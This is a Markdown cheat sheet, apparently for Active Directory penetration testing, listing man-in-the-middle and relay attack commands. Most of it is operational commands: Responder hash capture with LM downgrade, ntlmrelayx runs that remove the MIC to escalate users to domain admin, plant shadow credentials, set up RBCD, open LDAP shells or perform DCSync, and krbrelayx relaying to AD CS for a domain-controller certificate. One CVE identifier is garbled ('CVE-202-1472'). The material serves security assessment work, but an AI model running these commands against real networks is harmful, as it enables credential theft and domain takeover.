---
title: "Man In The Middle (Listen and Relay)"
description: "Man In The Middle (Listen and Relay) techniques and commands for Active Directory security assessment."
---
# Man In The Middle (Listen and Relay)
## Listen *Hash NTLMv1 or NTLMv2 || Username || Credentials (ldap/http)*{: .highlight} 
- `responder -l <interface> #use --lm to force downgrade`
- `smbclient.py`

## NTLM relay
- MS08-068 self relay @CVE@
  - `msf> exploit/windows/smb_smb_relay # windows 2000 / windows server 2008`

- SMB -> LDAP(S)
  - NTLMv1
    - remove mic (no CVE needed)  *see LDAP(S)*{: .highlight}
  - NTLMv2
    - Remove mic (CVE-2019-1040) @CVE@ *see LDAP(S)*{: .highlight}

- HTTP(S) -> LDAP(S)
  - Usually from webdav coerce *see LDAP(S)*{: .highlight}

- To LDAP(S)
  - Relay to LDAP if LDAP signing and LDAPS channel binding not enforced (default)
    - `ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --add-computer <computer_name> <computer_password> --delegate-access ` *RBCD*{: .highlight}
    - `ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --shadow-credentials --shadow-target '<dc_name$>'` *Shadow Credentials*{: .highlight}
    - `ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --escalate-user <user>` *Domain admin*{: .highlight}
    - `ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --interactive # connect to ldap_shell with nc 127.0.0.1 10111` *LDAP SHELL*{: .highlight}

- To SMB
  - Relay to SMB (if SMB is not signed)
    - Find SMB not signed targets (default if not a Domain controler)
      - `nxc smb <ip_range> --gen-relay-list smb_unsigned_ips.txt`
    - `ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support [--ipv6] -socks` *SMB Socks*{: .highlight}

- To HTTP 
  - Relay to CA web enrollement *ESC8*{: .highlight}
  - Relay to WSUS *WSUS*{: .highlight}

- To MsSQL
  - `ntlmrelayx.py -t mssql://<ip> [-smb2support] -socks` *MSSQL Socks*{: .highlight}

- SMB -> NETLOGON
  - Zero-Logon (safe method) (CVE-202-1472) @CVE@
    - Relay one dc to another
      - `ntlmrelayx.py -t dcsync://<dc_to_ip> -smb2support -auth-smb <user>:<password>` *DCSYNC*{: .highlight}

## Kerberos relay
- To HTTP
  - `krbrelayx.py -t 'http://<pki>/certsrv/certfnsh.asp' --adcs --template DomainController -v '<target_netbios>$' -ip <attacker_ip>` *ESC8*{: .highlight}
- SMB -> SMB
  - same as NTLM relay, use krbrelayx.py
- SMB -> LDAP(S)
  - same as NTLM relay, use krbrelayx.py